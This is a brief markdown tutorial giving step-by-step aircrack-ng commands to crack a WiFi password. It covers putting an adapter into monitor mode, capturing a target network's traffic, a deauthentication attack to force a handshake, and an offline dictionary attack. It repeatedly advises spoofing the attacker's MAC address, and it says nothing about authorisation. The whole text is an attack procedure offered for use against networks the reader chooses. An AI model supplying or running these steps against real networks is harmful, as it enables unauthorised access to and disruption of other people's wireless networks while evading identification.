Wifi Password Cracking With Aircrack-ng 
=======================================


Make sure your adapter supports *montitor mode* and install `aircrack-ng`.

### Step 0

```
	$ ifconfig
```

Check if network device, that supports monitor mode, is listed. Note the name
of the device. Change the device `mac address` using `macchanger`.

### Step 1
Start airmon-ng on network `interface` by using

```
	$ sudo airmon-ng start <interface>
```

To start airmon-ng on a given channel type

```	
	$ sudo airmon-ng start <interface> <channel>
```

Run `ifconfig` and note the new nameof the network interface  (after setting the
interface to monitor mode).

### Step 2

In a new terminal window type

```	
	$ sudo airodump-ng <interface-mon>
```

Where `interface-mon` is the name of network interface in monitor mode. This
will sniff all packets in air and show mac addresses of wifi hotspots.

### Step 3

Airodump the macaddress which you want to attack

```
	$ sudo airodump-ng --bssid <MAC> --channel 1 --write <filename> <interface>
```

This will save all packets directed to device with mac address `MAC`.

### Step 4
Deauthentication attack

```
	$  sudo aireplay-ng --deauth 50 -a <MAC> <interface> 
```	

This will send deauthentication packets in air, pretending to be device with mac
address `MAC`. Hope for a handshake capture.


### Step 5

Once a handshake is captured. Use dictionary attack against captured packets that are
being saved, see `Step 3`.

```	
	$ aircrack-ng -w <dictionary>  <captured packets> 
```

If the wifi password is weak, password will be cracked in a matter of seconds.

### Step 6
Set wifi interface to normal mode.

```
	$ sudo airmon-ng stop <interface>
```

### Notes
	
1. Make sure you change MAC Address of your device with `macchanger`.
